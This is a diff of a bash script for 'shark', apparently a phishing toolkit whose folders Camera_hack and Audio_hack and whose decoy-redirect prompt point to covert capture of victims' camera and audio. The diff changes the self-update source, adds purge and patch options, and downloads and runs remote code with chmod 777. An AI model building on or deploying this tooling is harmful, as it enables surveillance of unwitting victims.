@@ -65,20 +65,27 @@ if [ -e $BIN/termux-info ]; then
                 BIN="${PREFIX}/bin"
 		php="${PREFIX}/share/phs"
 		files="/sdcard"
+		shark="${PREFIX}/share/shark"
+                old_shark="${PREFIX}/bin/shark"
 		OS=TERMUX
 	else
 	        BIN="/usr/bin"
 	        php="/usr/share/phs"
 		files="$HOME/Desktop"
+		shark="/usr/share/shark"
+		old_shark="/usr/bin/shark"
 		OS=DEBIAN 
 fi
 }
 
+
 function main_update() {
-wget https://github.com/Bhaviktutorials/shark/raw/main/shark -O ${hackadroid} && rm -rf ${old_hackadroid} && cp -rf ${hackadroid} /usr/bin && chmod 777 /usr/bin/hackadroid"
+wget https://github.com/just-hack/shark/raw/master/shark -O ${shark}/shark && rm -rf ${old_shark} && cp -rf ${shark}/shark $BIN && chmod 777 $BIN/shark
 }
+
+
 function update() {
-	version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutrials/shark/master/shark | grep -w "VERSION=" | head -n1)
+	version=$(curl -L -s https://raw.githubusercontent.com/just-hack/shark/master/shark | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
 	if [ "${1}" != "-u" ] || [ "${1}" != "--update" ]; then
 		[ ${latest_version} != ${VERSION} ] && echo && msg "shark update is available !!" && sleep 2.5 && echo && msg "Run shark -u , shark --update" && echo && exit 1;	       
@@ -109,7 +116,7 @@ function connection() {
 
 function check_update() {	
         connection
-        version=$(curl -L -s https://raw.githubusercontent.com/Bhaviktutorials/shark/master/shark | grep -w "VERSION=" | head -n1)
+        version=$(curl -L -s https://raw.githubusercontent.com/just-hack/shark/master/shark | grep -w "VERSION=" | head -n1)
 	latest_version=$(echo ${version} | sed -e 's/[^0-9]\+[^0-9]/ /g' | cut -d '"' -f1)
         if [ ${latest_version} = ${VERSION} ];then		
                 echo -e "\tReading \tpackage \tlists... \tDone
@@ -138,9 +145,24 @@ Options:
   -v, --version     Display the current shark version installed on your device
   -h, --help        Print this help message
   -a, --assist      List detail discription of shark
-For additional info, see: http://github.com/Bhaviktutorials/shark
+  -p, --purge       Uninstall shark
+  --fix-ngrok       Fix ngrok issue (add new authtoken)
+  --fix-patches     Check missing packages & fix patches
+For additional info, see: https://github.com/Bhaviktutorials/shark
 EOF
 }
+
+function purge_shark() {
+printf "${red} Do you wish to delete camera and audio files too ? y/n " && read ans && [ "$ans" != "${ans#[Yy]}" ] && rm -rf ${files}/Camera_hack ${files}/Audio_hack
+rm -rf ${shark} ${old_shark}
+}
+
+
+function assist() {
+#put manpage in man dir later
+man ${shark}/manpage
+}
+
 
 ###########
 # OPTS ARG
@@ -152,7 +174,7 @@ while true; do
                 -u|--update)			
 	                check_update
 			;;
-
+			
                 -h|--help)			
                         usage       
                         exit 1
@@ -162,12 +184,24 @@ while true; do
                         printf "version $VERSION\n"
                         exit 1
                         ;;
+			
+		-p|--purge)
+		        purge_shark
+			exit 1
+			;;
 
 		-a|--assist)
 			assist
 			exit 1
 			;;
-			
+						
+		--fix-patches)			
+			sed -i -e 's/\r$//' ${shark}/setup
+			chmod 777 ${shark}/setup
+		        ${shark}/setup
+			exit 1
+			;;
+					
                 -*)			
                         echo "ERROR: unknown option '$1'" 1>&2
                         echo "see '--help' for usage" 1>&2
@@ -1458,7 +1492,7 @@ echo
 	           elif [ $option = 32 ]
 	           then 
 		            cd $phs/Audio_hack
-		            file_check1
+		            file_check
 			    echo
 			    default_redirect="https://www.youtube.com/channel/UCMhYgk0-nIHHtnRNkL9zpgQ/about"
                             printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a distracting website (Default:\e[0m\e[1;77m https://youtube.com\e[0m\e[1;92m ): \e[0m" $default_redirect
